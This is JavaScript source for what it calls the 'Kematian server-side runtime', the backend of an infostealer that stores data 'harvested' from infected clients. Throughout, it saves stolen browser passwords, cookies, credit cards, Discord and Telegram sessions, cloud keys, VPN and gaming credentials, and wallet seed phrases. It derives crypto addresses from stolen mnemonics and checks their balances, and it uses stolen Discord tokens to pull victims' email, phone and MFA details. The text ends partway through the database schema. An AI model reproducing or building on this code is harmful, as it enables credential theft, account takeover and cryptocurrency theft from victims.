// Kematian server-side runtime — persists harvested data from every client into plugin.db
import { decrypt as secoDecrypt } from "secure-container";
import { fromBuffer as seedFromBuffer } from "bitcoin-seed";
import { gunzipSync, inflateRawSync } from "zlib";
import { HDKey } from "@scure/bip32";
import { mnemonicToSeedSync } from "@scure/bip39";
import { wordlist } from "@scure/bip39/wordlists/english";
import { keccak_256 } from "@noble/hashes/sha3";
import { ripemd160 } from "@noble/hashes/ripemd160";
import { sha256 } from "@noble/hashes/sha256";
import { secp256k1 } from "@noble/curves/secp256k1";
import { mkdirSync, writeFileSync, readFileSync, unlinkSync, readdirSync, rmSync, existsSync } from "fs";
import { join } from "path";

// ── Address derivation helpers ──────────────────────────────────────────

const BASE58_ALPHABET = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz";
function base58Encode(buf) {
  let num = BigInt("0x" + Buffer.from(buf).toString("hex"));
  let str = "";
  while (num > 0n) { str = BASE58_ALPHABET[Number(num % 58n)] + str; num /= 58n; }
  for (const b of buf) { if (b === 0) str = "1" + str; else break; }
  return str;
}
function base58Check(payload) {
  const checksum = sha256(sha256(payload)).slice(0, 4);
  return base58Encode(Buffer.concat([payload, Buffer.from(checksum)]));
}

const BECH32_CHARSET = "qpzry9x8gf2tvdw0s3jn54khce6mua7l";
function bech32Encode(hrp, data) {
  function polymod(values) {
    const GEN = [0x3b6a57b2, 0x26508e6d, 0x1ea119fa, 0x3d4233dd, 0x2a1462b3];
    let chk = 1;
    for (const v of values) { const b = chk >> 25; chk = ((chk & 0x1ffffff) << 5) ^ v; for (let i = 0; i < 5; i++) if ((b >> i) & 1) chk ^= GEN[i]; }
    return chk;
  }
  function hrpExpand(h) { const r = []; for (const c of h) r.push(c.charCodeAt(0) >> 5); r.push(0); for (const c of h) r.push(c.charCodeAt(0) & 31); return r; }
  const values = [...hrpExpand(hrp), ...data];
  const pm = polymod([...values, 0, 0, 0, 0, 0, 0]) ^ 1;
  const checksum = [];
  for (let i = 0; i < 6; i++) checksum.push((pm >> (5 * (5 - i))) & 31);
  return hrp + "1" + [...data, ...checksum].map(d => BECH32_CHARSET[d]).join("");
}
function convertBits(data, fromBits, toBits) {
  let acc = 0, bits = 0; const ret = [];
  for (const val of data) { acc = (acc << fromBits) | val; bits += fromBits; while (bits >= toBits) { bits -= toBits; ret.push((acc >> bits) & ((1 << toBits) - 1)); } }
  if (bits > 0) ret.push((acc << (toBits - bits)) & ((1 << toBits) - 1));
  return ret;
}

function deriveEthAddresses(mnemonic, count = 5) {
  const seed = mnemonicToSeedSync(mnemonic);
  const master = HDKey.fromMasterSeed(seed);
  const addrs = [];
  for (let i = 0; i < count; i++) {
    const child = master.derive(`m/44'/60'/0'/0/${i}`);
    const pubUncompressed = secp256k1.ProjectivePoint.fromPrivateKey(child.privateKey).toRawBytes(false).slice(1);
    const hash = keccak_256(pubUncompressed);
    addrs.push("0x" + Buffer.from(hash.slice(-20)).toString("hex"));
  }
  return addrs;
}

function deriveBtcAddresses(mnemonic, count = 3) {
  const seed = mnemonicToSeedSync(mnemonic);
  const master = HDKey.fromMasterSeed(seed);
  const addrs = [];
  // BIP84 native segwit (bc1...)
  for (let i = 0; i < count; i++) {
    const child = master.derive(`m/84'/0'/0'/0/${i}`);
    const pub = child.publicKey;
    const h = ripemd160(sha256(pub));
    const words = [0, ...convertBits(h, 8, 5)];
    addrs.push(bech32Encode("bc", words));
  }
  // BIP44 legacy (1...)
  for (let i = 0; i < count; i++) {
    const child = master.derive(`m/44'/0'/0'/0/${i}`);
    const pub = child.publicKey;
    const h = ripemd160(sha256(pub));
    const payload = Buffer.alloc(21); payload[0] = 0x00; Buffer.from(h).copy(payload, 1);
    addrs.push(base58Check(payload));
  }
  return addrs;
}

function deriveLtcAddresses(mnemonic, count = 3) {
  const seed = mnemonicToSeedSync(mnemonic);
  const master = HDKey.fromMasterSeed(seed);
  const addrs = [];
  // BIP84 native segwit (ltc1...)
  for (let i = 0; i < count; i++) {
    const child = master.derive(`m/84'/2'/0'/0/${i}`);
    const pub = child.publicKey;
    const h = ripemd160(sha256(pub));
    const words = [0, ...convertBits(h, 8, 5)];
    addrs.push(bech32Encode("ltc", words));
  }
  // BIP44 legacy (L...)
  for (let i = 0; i < count; i++) {
    const child = master.derive(`m/44'/2'/0'/0/${i}`);
    const pub = child.publicKey;
    const h = ripemd160(sha256(pub));
    const payload = Buffer.alloc(21); payload[0] = 0x30; Buffer.from(h).copy(payload, 1);
    addrs.push(base58Check(payload));
  }
  return addrs;
}

function deriveTrxAddresses(mnemonic, count = 3) {
  const seed = mnemonicToSeedSync(mnemonic);
  const master = HDKey.fromMasterSeed(seed);
  const addrs = [];
  for (let i = 0; i < count; i++) {
    const child = master.derive(`m/44'/195'/0'/0/${i}`);
    const pubUncompressed = secp256k1.ProjectivePoint.fromPrivateKey(child.privateKey).toRawBytes(false).slice(1);
    const hash = keccak_256(pubUncompressed);
    const payload = Buffer.alloc(21); payload[0] = 0x41; Buffer.from(hash.slice(-20)).copy(payload, 1);
    addrs.push(base58Check(payload));
  }
  return addrs;
}

// ERC-20 token contracts (same address across EVM chains)
const ERC20_TOKENS = {
  ETH: [
    { symbol: "USDT", contract: "0xdac17f958d2ee523a2206206994597c13d831ec7", decimals: 6 },
    { symbol: "USDC", contract: "0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48", decimals: 6 },
    { symbol: "DAI",  contract: "0x6b175474e89094c44da98b954eedeac495271d0f", decimals: 18 },
  ],
  BSC: [
    { symbol: "USDT", contract: "0x55d398326f99059ff775485246999027b3197955", decimals: 18 },
    { symbol: "USDC", contract: "0x8ac76a51cc950d9822d68b83fe1ad97b32cd580d", decimals: 18 },
  ],
  Polygon: [
    { symbol: "USDT", contract: "0xc2132d05d31c914a87c6611c10748aeb04b58e8f", decimals: 6 },
    { symbol: "USDC", contract: "0x3c499c542cef5e3811e1192ce70d8cc03d5c3359", decimals: 6 },
  ],
  Arbitrum: [
    { symbol: "USDT", contract: "0xfd086bc7cd5c481dcc9c85ebe478a1c0b69fcbb9", decimals: 6 },
    { symbol: "USDC", contract: "0xaf88d065e77c8cc2239327c5edb3a432268e5831", decimals: 6 },
  ],
  Avalanche: [
    { symbol: "USDT", contract: "0x9702230a8ea53601f5cd2dc00fdbc13d4df4a8c7", decimals: 6 },
    { symbol: "USDC", contract: "0xb97ef9ef8734c71904d8002f8b6bc66dd9c48a6e", decimals: 6 },
  ],
  Base: [
    { symbol: "USDC", contract: "0x833589fcd6edb6e08f4c7c32d4f71b54bda02913", decimals: 6 },
  ],
};

const FETCH_TIMEOUT_MS = 8000;
function fetchWithTimeout(url, opts = {}) {
  const ctrl = new AbortController();
  const timer = setTimeout(() => ctrl.abort(), FETCH_TIMEOUT_MS);
  return fetch(url, { ...opts, signal: ctrl.signal }).finally(() => clearTimeout(timer));
}

async function checkEvmNativeBalances(addresses) {
  const balances = {};
  await Promise.all(BALANCE_CHAINS.map(async (chain) => {
    try {
      const res = await fetchWithTimeout(chain.rpc, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(addresses.map((addr, i) => ({
          jsonrpc: "2.0", method: "eth_getBalance", params: [addr, "latest"], id: i,
        }))),
      });
      const data = await res.json();
      for (const r of Array.isArray(data) ? data : [data]) {
        if (!r.result) continue;
        const wei = BigInt(r.result);
        if (wei === 0n) continue;
        const addr = addresses[r.id];
        if (!balances[addr]) balances[addr] = {};
        balances[addr][chain.name] = Number(wei) / 1e18;
      }
    } catch (_) {}
  }));
  return balances;
}

async function checkErc20Balances(addresses) {
  const balances = {};
  const balanceOfSig = "0x70a08231";
  await Promise.all(BALANCE_CHAINS.map(async (chain) => {
    const tokens = ERC20_TOKENS[chain.name] || [];
    if (!tokens.length) return;
    const calls = [];
    for (const addr of addresses) {
      for (const token of tokens) {
        const paddedAddr = addr.slice(2).padStart(64, "0");
        calls.push({
          jsonrpc: "2.0", method: "eth_call",
          params: [{ to: token.contract, data: balanceOfSig + paddedAddr }, "latest"],
          id: calls.length,
          _addr: addr, _token: token, _chain: chain.name,
        });
      }
    }
    if (!calls.length) return;
    try {
      const rpcCalls = calls.map(({ _addr, _token, _chain, ...c }) => c);
      const res = await fetchWithTimeout(chain.rpc, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(rpcCalls),
      });
      const data = await res.json();
      for (const r of Array.isArray(data) ? data : [data]) {
        if (!r.result || r.result === "0x" || r.result === "0x0") continue;
        const raw = BigInt(r.result);
        if (raw === 0n) continue;
        const call = calls[r.id];
        const val = Number(raw) / (10 ** call._token.decimals);
        if (val < 0.001) continue;
        const addr = call._addr;
        const label = `${call._token.symbol} (${call._chain})`;
        if (!balances[addr]) balances[addr] = {};
        balances[addr][label] = val;
      }
    } catch (_) {}
  }));
  return balances;
}

async function checkBtcBalances(addresses) {
  const balances = {};
  await Promise.all(addresses.map(async (addr) => {
    try {
      const res = await fetchWithTimeout(`https://blockstream.info/api/address/${addr}`);
      if (!res.ok) return;
      const data = await res.json();
      const funded = data.chain_stats?.funded_txo_sum || 0;
      const spent = data.chain_stats?.spent_txo_sum || 0;
      const bal = (funded - spent) / 1e8;
      if (bal > 0) balances[addr] = { BTC: bal };
    } catch (_) {}
  }));
  return balances;
}

async function checkLtcBalances(addresses) {
  const balances = {};
  await Promise.all(addresses.map(async (addr) => {
    try {
      const res = await fetchWithTimeout(`https://api.blockcypher.com/v1/ltc/main/addrs/${addr}/balance`);
      if (!res.ok) return;
      const data = await res.json();
      const bal = (data.balance || 0) / 1e8;
      if (bal > 0) balances[addr] = { LTC: bal };
    } catch (_) {}
  }));
  return balances;
}

async function checkTrxBalances(addresses) {
  const balances = {};
  await Promise.all(addresses.map(async (addr) => {
    try {
      const res = await fetchWithTimeout(`https://apilist.tronscanapi.com/api/accountv2?address=${addr}`, {
        headers: { "TRON-PRO-API-KEY": "" },
      });
      if (!res.ok) return;
      const data = await res.json();
      const trxBal = (data.balance || 0) / 1e6;
      if (trxBal > 0) {
        if (!balances[addr]) balances[addr] = {};
        balances[addr]["TRX"] = trxBal;
      }
      for (const t of data.withPriceTokens || []) {
        if (t.tokenAbbr === "USDT" && Number(t.balance) > 0) {
          if (!balances[addr]) balances[addr] = {};
          balances[addr]["USDT (TRC20)"] = Number(t.balance) / (10 ** (t.tokenDecimal || 6));
        }
      }
    } catch (_) {}
  }));
  return balances;
}

let stmts = null;
let blobDir = null;
let pluginSettings = {
  capture_history: true,
  capture_cookies: true,
  history_limit: 5000,
  cookie_max_age_days: 30,
};

function safeFsName(s) {
  return String(s).replace(/[^a-zA-Z0-9._-]/g, '_').slice(0, 120);
}
function walletBlobPath(clientId, name) {
  return join(blobDir, `wd_${safeFsName(clientId)}_${safeFsName(name)}.bin`);
}
function telegramBlobPath(clientId, account) {
  return join(blobDir, `tg_${safeFsName(clientId)}_${safeFsName(account)}.bin`);
}
function writeBlob(filePath, data) {
  try { writeFileSync(filePath, data); return true; } catch (_) { return false; }
}
function readBlob(filePath) {
  try { return readFileSync(filePath); } catch (_) { return null; }
}
function deleteBlob(filePath) {
  try { if (existsSync(filePath)) unlinkSync(filePath); } catch (_) {}
}

function readWalletContent(db, clientId, walletName) {
  const row = db.prepare(`SELECT content, blob_path FROM wallet_data WHERE client_id = ? AND name = ?`).get(clientId, walletName);
  if (!row) return null;
  if (row.blob_path) { const d = readBlob(row.blob_path); if (d) return d; }
  return row.content ? Buffer.from(row.content) : null;
}
function readWalletContentById(db, id) {
  const row = db.prepare(`SELECT name, content, blob_path FROM wallet_data WHERE id = ?`).get(id);
  if (!row) return null;
  let data = null;
  if (row.blob_path) data = readBlob(row.blob_path);
  if (!data && row.content) data = Buffer.from(row.content);
  return data ? { name: row.name, content: data } : null;
}
function readTelegramContentById(db, id) {
  const row = db.prepare(`SELECT account, content, blob_path FROM telegram_sessions WHERE id = ?`).get(id);
  if (!row) return null;
  let data = null;
  if (row.blob_path) data = readBlob(row.blob_path);
  if (!data && row.content) data = Buffer.from(row.content);
  return data ? { account: row.account, content: data } : null;
}

function deleteClientBlobs(clientId) {
  if (!blobDir) return;
  const prefix = safeFsName(clientId);
  try {
    for (const f of readdirSync(blobDir)) {
      if (f.startsWith(`wd_${prefix}_`) || f.startsWith(`tg_${prefix}_`))
        deleteBlob(join(blobDir, f));
    }
  } catch (_) {}
}
function deleteAllBlobs() {
  if (!blobDir) return;
  try { rmSync(blobDir, { recursive: true, force: true }); mkdirSync(blobDir, { recursive: true }); } catch (_) {}
}

function loadSettings(db) {
  try {
    const rows = db.prepare(`SELECT key, value FROM settings`).all();
    for (const r of rows) {
      if (r.key === 'capture_history') pluginSettings.capture_history = r.value !== '0';
      else if (r.key === 'capture_cookies') pluginSettings.capture_cookies = r.value !== '0';
      else if (r.key === 'history_limit') pluginSettings.history_limit = Math.max(0, Number(r.value) || 0);
      else if (r.key === 'cookie_max_age_days') pluginSettings.cookie_max_age_days = Math.max(0, Number(r.value) || 0);
    }
  } catch (_) {}
}

function runPurge(db) {
  let total = 0;
  if (pluginSettings.history_limit > 0) {
    const clients = db.prepare(`SELECT client_id FROM history GROUP BY client_id HAVING COUNT(*) > ?`).all(pluginSettings.history_limit);
    for (const c of clients) {
      const r = db.prepare(`DELETE FROM history WHERE client_id = ? AND id NOT IN (SELECT id FROM history WHERE client_id = ? ORDER BY visit_time_unix DESC LIMIT ?)`).run(c.client_id, c.client_id, pluginSettings.history_limit);
      total += r.changes;
    }
  }
  if (pluginSettings.cookie_max_age_days > 0) {
    const cutoff = Date.now() - (pluginSettings.cookie_max_age_days * 86400000);
    const r = db.prepare(`DELETE FROM cookies WHERE captured_at < ?`).run(cutoff);
    total += r.changes;
  }
  return total;
}

const BALANCE_CHAINS = [
  { name: "ETH",      rpc: "https://rpc.ankr.com/eth" },
  { name: "BSC",      rpc: "https://rpc.ankr.com/bsc" },
  { name: "Polygon",  rpc: "https://rpc.ankr.com/polygon" },
  { name: "Arbitrum", rpc: "https://rpc.ankr.com/arbitrum" },
  { name: "Optimism", rpc: "https://rpc.ankr.com/optimism" },
  { name: "Avalanche",rpc: "https://rpc.ankr.com/avalanche" },
  { name: "Base",     rpc: "https://rpc.ankr.com/base" },
];

async function enrichDiscordToken(ctx, clientId, token) {
  const now = Date.now();
  const h = {
    Authorization: token,
    'Content-Type': 'application/json',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
  };
  try {
    const [meRes, guildsRes, relsRes] = await Promise.all([
      fetch('https://discord.com/api/v10/users/@me', { headers: h }),
      fetch('https://discord.com/api/v10/users/@me/guilds', { headers: h }),
      fetch('https://discord.com/api/v10/users/@me/relationships', { headers: h }),
    ]);
    const me = await meRes.json();
    if (!meRes.ok) {
      ctx.db.prepare(`INSERT OR REPLACE INTO discord_profiles(client_id,token,error,enriched_at) VALUES(?,?,?,?)`)
        .run(clientId, token, me.message || `HTTP ${meRes.status}`, now);
      return;
    }
    const guilds  = guildsRes.ok ? await guildsRes.json() : [];
    const rels    = relsRes.ok  ? await relsRes.json()   : [];
    const friends = Array.isArray(rels) ? rels.filter(r => r.type === 1).length : 0;
    const gNames  = Array.isArray(guilds) ? guilds.slice(0, 30).map(g => g.name).join('|') : '';
    ctx.db.prepare(`INSERT OR REPLACE INTO discord_profiles(
      client_id,token,user_id,username,discriminator,global_name,avatar,email,phone,
      verified,mfa_enabled,premium_type,flags,public_flags,locale,
      friends_count,guilds_count,guild_names,enriched_at,error
    ) VALUES(?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,NULL)`)
    .run(
      clientId, token, me.id, me.username, me.discriminator || '0',
      me.global_name || null, me.avatar || null, me.email || null, me.phone || null,
      me.verified ? 1 : 0, me.mfa_enabled ? 1 : 0, me.premium_type || 0,
      me.flags || 0, me.public_flags || 0, me.locale || null,
      friends, Array.isArray(guilds) ? guilds.length : 0, gNames || null, now,
    );
  } catch (e) {
    ctx.db.prepare(`INSERT OR REPLACE INTO discord_profiles(client_id,token,error,enriched_at) VALUES(?,?,?,?)`)
      .run(clientId, token, e.message, now);
  }
}

function needsEnrichment(ctx, token) {
  const row = ctx.db.prepare(`SELECT enriched_at FROM discord_profiles WHERE token = ?`).get(token);
  return !row || !row.enriched_at;
}

function extractVaultAccounts(vaultData) {
  const accounts = [];
  try {
    const keyrings = Array.isArray(vaultData) ? vaultData : [vaultData];
    for (const kr of keyrings) {
      if (kr.type === 'HD Key Tree' && Array.isArray(kr.accounts)) {
        for (const addr of kr.accounts) accounts.push({ type: 'HD', address: addr });
      } else if (kr.type === 'Simple Key Pair' && Array.isArray(kr.accounts)) {
        for (const addr of kr.accounts) accounts.push({ type: 'Imported', address: addr });
      } else if (Array.isArray(kr.accounts)) {
        for (const addr of kr.accounts) accounts.push({ type: kr.type || 'Unknown', address: addr });
      }
      if (kr.mnemonic) accounts.push({ type: 'Mnemonic', mnemonic: kr.mnemonic });
    }
  } catch (_) {}
  return accounts;
}

function prepareStatements(db) {
  return {
    insPw:     db.prepare(`INSERT OR REPLACE INTO passwords(client_id,url,username,password,browser,profile,captured_at) VALUES(?,?,?,?,?,?,?)`),
    insCk:     db.prepare(`INSERT OR REPLACE INTO cookies(client_id,host,name,value,path,secure,http_only,expires_utc,browser,profile,captured_at) VALUES(?,?,?,?,?,?,?,?,?,?,?)`),
    insAf:     db.prepare(`INSERT OR IGNORE INTO autofill(client_id,name,value,browser,profile,captured_at) VALUES(?,?,?,?,?,?)`),
    insHi:     db.prepare(`INSERT OR IGNORE INTO history(client_id,url,title,visit_time_unix,browser,profile,captured_at) VALUES(?,?,?,?,?,?,?)`),
    insBk:     db.prepare(`INSERT OR REPLACE INTO bookmarks(client_id,name,url,type,browser,profile,captured_at) VALUES(?,?,?,?,?,?,?)`),
    insCc:     db.prepare(`INSERT OR REPLACE INTO credit_cards(client_id,name_on_card,card_number,expiration_month,expiration_year,nickname,browser,profile,captured_at) VALUES(?,?,?,?,?,?,?,?,?)`),
    insDt:     db.prepare(`INSERT OR IGNORE INTO discord_tokens(client_id,token,source,captured_at) VALUES(?,?,?,?)`),
    insFi:     db.prepare(`INSERT OR REPLACE INTO files(client_id,dir,name,ext,size,modified,path,tags,captured_at) VALUES(?,?,?,?,?,?,?,?,?)`),
    insEx:     db.prepare(`INSERT OR REPLACE INTO extensions(client_id,ext_id,name,version,browser,profile,path,category,captured_at) VALUES(?,?,?,?,?,?,?,?,?)`),
    insWl:     db.prepare(`INSERT OR REPLACE INTO wallets(client_id,name,type,path,files,size,captured_at) VALUES(?,?,?,?,?,?,?)`),
    insTg:     db.prepare(`INSERT OR REPLACE INTO telegram_sessions(client_id,account,path,files,size,captured_at) VALUES(?,?,?,?,?,?)`),
    insKey:    db.prepare(`INSERT OR REPLACE INTO cloud_keys(client_id,type,name,path,size,content,captured_at) VALUES(?,?,?,?,?,?,?)`),
    insSeed:   db.prepare(`INSERT OR REPLACE INTO seeds(client_id,source,path,phrase,words,valid,addresses,captured_at) VALUES(?,?,?,?,?,?,?,?)`),
    insApp:    db.prepare(`INSERT OR REPLACE INTO app_credentials(client_id,application,host,port,username,password,protocol,extra,captured_at) VALUES(?,?,?,?,?,?,?,?,?)`),
    insGaming: db.prepare(`INSERT OR REPLACE INTO gaming_items(client_id,platform,label,value,detail,captured_at) VALUES(?,?,?,?,?,?)`),
    insVpn:    db.prepare(`INSERT OR REPLACE INTO vpn_items(client_id,provider,label,value,detail,captured_at) VALUES(?,?,?,?,?,?)`),
    upsertRun: db.prepare(`INSERT OR REPLACE INTO client_runs(client_id,last_captured_at) VALUES(?,?)`),
    insErr:    db.prepare(`INSERT INTO collect_errors(client_id,error,created_at) VALUES(?,?,?)`),
  };
}

function clearClient(db, clientId) {
  deleteClientBlobs(clientId);
  for (const tbl of ["passwords","cookies","autofill","history","bookmarks","credit_cards","discord_tokens","discord_profiles","files","extensions","wallets","wallet_data","telegram_sessions","cloud_keys","seeds","app_credentials","gaming_items","vpn_items"])
    db.prepare(`DELETE FROM ${tbl} WHERE client_id=?`).run(clientId);
}

// storeErrors persists collection/scan failure notes so partial failures can
// be surfaced in the UI instead of silently swallowed.
function storeErrors(db, s, clientId, errs, now) {
  const list = Array.isArray(errs) ? errs : (errs ? [errs] : []);
  for (const e of list)
    if (e) s.insErr.run(clientId, String(e), now);
}

function insertPayload(db, s, clientId, payload, now) {
  for (const r of payload.passwords || [])
    s.insPw.run(clientId, r.url, r.username, r.password, r.browser, r.profile, now);
  if (pluginSettings.capture_cookies)
    for (const r of payload.cookies || [])
      s.insCk.run(clientId, r.host, r.name, r.value, r.path, r.secure ? 1 : 0, r.httpOnly ? 1 : 0, r.expiresUtc, r.browser, r.profile, now);
  for (const r of payload.autofill || [])
    s.insAf.run(clientId, r.name, r.value, r.browser, r.profile, now);
  if (pluginSettings.capture_history)
    for (const r of payload.history || [])
      s.insHi.run(clientId, r.url, r.title, r.visitTimeUnix, r.browser, r.profile, now);
  for (const r of payload.bookmarks || [])
    s.insBk.run(clientId, r.name, r.url, r.type, r.browser, r.profile, now);
  for (const r of payload.creditCards || [])
    s.insCc.run(clientId, r.nameOnCard, r.cardNumber, r.expirationMonth, r.expirationYear, r.nickname, r.browser, r.profile, now);
  for (const r of payload.discordTokens || [])
    s.insDt.run(clientId, r.token, r.source, now);
  for (const r of payload.files || [])
    s.insFi.run(clientId, r.dir, r.name, r.ext, r.size, r.modified, r.path, (r.tags || []).join(",") || null, now);
  for (const r of payload.extensions || [])
    s.insEx.run(clientId, r.extId, r.name, r.version, r.browser, r.profile, r.path, r.category || null, now);
  for (const r of payload.wallets || [])
    s.insWl.run(clientId, r.name, r.type || null, r.path, r.files, r.size, now);
  for (const r of payload.telegram || [])
    s.insTg.run(clientId, r.account, r.path, r.files, r.size, now);
  for (const r of payload.keys || [])
    s.insKey.run(clientId, r.type, r.name, r.path, r.size, r.content || null, now);
  for (const r of payload.appCredentials || [])
    s.insApp.run(clientId, r.application, r.host || null, r.port || 0, r.username || null, r.password || null, r.protocol || null, r.extra || null, now);
  if (payload.gaming) {
    const g = payload.gaming;
    if (g.steam) {
      const st = g.steam;
      if (st.account) s.insGaming.run(clientId, "Steam", "Account", st.account, st.rememberPw ? "Remember PW" : "", now);
      if (st.token) s.insGaming.run(clientId, "Steam", "Token", st.token, "", now);
      if (st.steamPath) s.insGaming.run(clientId, "Steam", "Path", st.steamPath, "", now);
      for (const f of (st.ssfnFiles || [])) s.insGaming.run(clientId, "Steam", "SSFN", f, "", now);
      for (const gm of (st.games || [])) s.insGaming.run(clientId, "Steam", gm.name, gm.id, gm.installed ? "Installed" : "", now);
    }
    for (const b of (g.battleNet || [])) s.insGaming.run(clientId, "Battle.net", b.name, b.path, "", now);
    for (const e of (g.epic || [])) s.insGaming.run(clientId, "Epic", e.name, e.path, "", now);
    for (const r of (g.riot || [])) s.insGaming.run(clientId, "Riot", r.name, r.path, "", now);
    for (const u of (g.uplay || [])) s.insGaming.run(clientId, "Uplay", u.name, u.path, "", now);
  }
  if (payload.vpns) {
    const v = payload.vpns;
    for (const n of (v.nordvpn || [])) s.insVpn.run(clientId, "NordVPN", n.username, n.password, n.version, now);
    for (const w of (v.wireguard || [])) s.insVpn.run(clientId, "WireGuard", w.name, w.endpoint || "", w.interface || "", now);
    for (const o of (v.openvpn || [])) s.insVpn.run(clientId, "OpenVPN", o.name, o.path, "", now);
    for (const m of (v.mullvad || [])) s.insVpn.run(clientId, "Mullvad", m.accountNumber, m.settingsPath, "", now);
  }
}

const TABLE_CFGS = {
  passwords: {
    tbl: 'passwords',
    sel: 'client_id as clientId,url,username,password,browser,profile',
    searchOn: ['url', 'username'],
    order: 'captured_at DESC',
    hasBrowser: true,
  },
  cookies: {
    tbl: 'cookies',
    sel: 'client_id as clientId,host,name,value,path,secure,http_only as httpOnly,expires_utc as expiresUtc,browser,profile',
    searchOn: ['host', 'name'],
    order: 'captured_at DESC',
    hasBrowser: true,
  },
  autofill: {
    tbl: 'autofill',
    sel: 'client_id as clientId,name,value,browser,profile',
    searchOn: ['name', 'value'],
    order: 'captured_at DESC',
    hasBrowser: true,
  },
  history: {
    tbl: 'history',
    sel: 'client_id as clientId,url,title,visit_time_unix as visitTimeUnix,browser,profile',
    searchOn: ['url', 'title'],
    order: 'visit_time_unix DESC',
    hasBrowser: true,
  },
  bookmarks: {
    tbl: 'bookmarks',
    sel: 'client_id as clientId,name,url,type,browser,profile',
    searchOn: ['name', 'url'],
    order: 'captured_at DESC',
    hasBrowser: true,
  },
  credit_cards: {
    tbl: 'credit_cards',
    sel: 'client_id as clientId,name_on_card as nameOnCard,card_number as cardNumber,expiration_month as expirationMonth,expiration_year as expirationYear,nickname,browser,profile',
    searchOn: ['name_on_card', 'nickname'],
    order: 'captured_at DESC',
    hasBrowser: true,
  },
  discord_tokens: {
    tbl: 'discord_tokens',
    sel: 'client_id as clientId,token,source',
    searchOn: ['token', 'source'],
    order: 'captured_at DESC',
    hasBrowser: false,
  },
  files: {
    tbl: 'files',
    sel: 'client_id as clientId,dir,name,ext,size,modified,path,tags',
    searchOn: ['dir', 'name', 'path'],
    order: 'modified DESC',
    hasBrowser: false,
  },
  extensions: {
    tbl: 'extensions',
    sel: 'client_id as clientId,ext_id as extId,name,version,browser,profile,path,category',
    searchOn: ['name', 'ext_id'],
    order: 'captured_at DESC',
    hasBrowser: true,
  },
  wallets: {
    tbl: 'wallets',
    sel: 'client_id as clientId,name,type,path,files,size',
    searchOn: ['name', 'path'],
    order: 'captured_at DESC',
    hasBrowser: false,
  },
  telegram: {
    tbl: 'telegram_sessions',
    sel: 'client_id as clientId,account,path,files,size,(content IS NOT NULL OR blob_path IS NOT NULL) as hasContent',
    searchOn: ['account', 'path'],
    order: 'captured_at DESC',
    hasBrowser: false,
  },
  keys: {
    tbl: 'cloud_keys',
    sel: 'client_id as clientId,type,name,path,size,content',
    searchOn: ['type', 'name', 'path'],
    order: 'captured_at DESC',
    hasBrowser: false,
  },
  seeds: {
    tbl: 'seeds',
    sel: 'client_id as clientId,source,path,phrase,words,valid,addresses',
    searchOn: ['source', 'path', 'phrase'],
    order: 'valid DESC, captured_at DESC',
    hasBrowser: false,
  },
  app_credentials: {
    tbl: 'app_credentials',
    sel: 'client_id as clientId,application,host,port,username,password,protocol,extra',
    searchOn: ['application', 'host', 'username', 'protocol'],
    order: 'captured_at DESC',
    hasBrowser: false,
  },
  gaming_items: {
    tbl: 'gaming_items',
    sel: 'client_id as clientId,platform,label,value,detail',
    searchOn: ['platform', 'label', 'value'],
    order: 'captured_at DESC',
    hasBrowser: false,
  },
  vpn_items: {
    tbl: 'vpn_items',
    sel: 'client_id as clientId,provider,label,value,detail',
    searchOn: ['provider', 'label', 'value'],
    order: 'captured_at DESC',
    hasBrowser: false,
  },
};

function listTable(ctx, cfg, params) {
  const limit   = Math.max(0, Number(params?.limit  ?? 1000));
  const offset  = Math.max(0, Number(params?.offset ?? 0));
  const search  = String(params?.search  || '').trim();
  const cid     = params?.clientId;
  const browser = cfg.hasBrowser ? String(params?.browser || '') : '';

  const wheres = [], args = [];
  if (cid)     { wheres.push('client_id = ?'); args.push(cid); }
  if (browser) { wheres.push('browser = ?');   args.push(browser); }
  if (search && cfg.searchOn.length) {
    wheres.push('(' + cfg.searchOn.map(c => `${c} LIKE ?`).join(' OR ') + ')');
    for (let i = 0; i < cfg.searchOn.length; i++) args.push(`%${search}%`);
  }

  const where = wheres.length ? ' WHERE ' + wheres.join(' AND ') : '';
  const total = ctx.db.prepare(`SELECT COUNT(*) as n FROM ${cfg.tbl}${where}`).get(...args).n;

  let q = `SELECT ${cfg.sel} FROM ${cfg.tbl}${where} ORDER BY ${cfg.order}`;
  if (limit > 0) q += ` LIMIT ${limit} OFFSET ${offset}`;

  return { rows: ctx.db.prepare(q).all(...args), total };
}

export default {
  setup(ctx) {
    ctx.db.exec(`PRAGMA journal_mode=WAL`);
    ctx.db.exec(`PRAGMA synchronous=NORMAL`);
    ctx.db.exec(`PRAGMA cache_size=-16000`);
    ctx.db.exec(`PRAGMA temp_store=MEMORY`);
    ctx.db.exec(`PRAGMA mmap_size=268435456`);
    ctx.db.exec(`
      CREATE TABLE IF NOT EXISTS passwords (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        client_id TEXT NOT NULL,
        url TEXT, username TEXT, password TEXT, browser TEXT, profile TEXT,
        captured_at INTEGER NOT NULL
      );
      CREATE INDEX IF NOT EXISTS pw_client ON passwords(client_id);
      CREATE UNIQUE INDEX IF NOT EXISTS pw_dedup ON passwords(client_id, url, username, browser, profile);

      CREATE TABLE IF NOT EXISTS cookies (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        client_id TEXT NOT NULL,
        host TEXT, name TEXT, value TEXT, path TEXT,
        secure INTEGER, http_only INTEGER, expires_utc INTEGER,
        browser TEXT, profile TEXT,
        captured_at INTEGER NOT NULL
      );
      CREATE INDEX IF NOT EXISTS ck_client ON cookies(client_id);
      CREATE UNIQUE INDEX IF NOT EXISTS ck_dedup ON cookies(client_id, host, name, path, browser, profile);

      CREATE TABLE IF NOT EXISTS autofill (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        client_id TEXT NOT NULL,
        name TEXT, value TEXT, browser TEXT, profile TEXT,
        captured_at INTEGER NOT NULL
      );
      CREATE INDEX IF NOT EXISTS af_client ON autofill(client_id);
      CREATE UNIQUE INDEX IF NOT EXISTS af_dedup ON autofill(client_id, name, value, browser, profile);

      CREATE TABLE IF NOT EXISTS history (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        client_id TEXT NOT NULL,
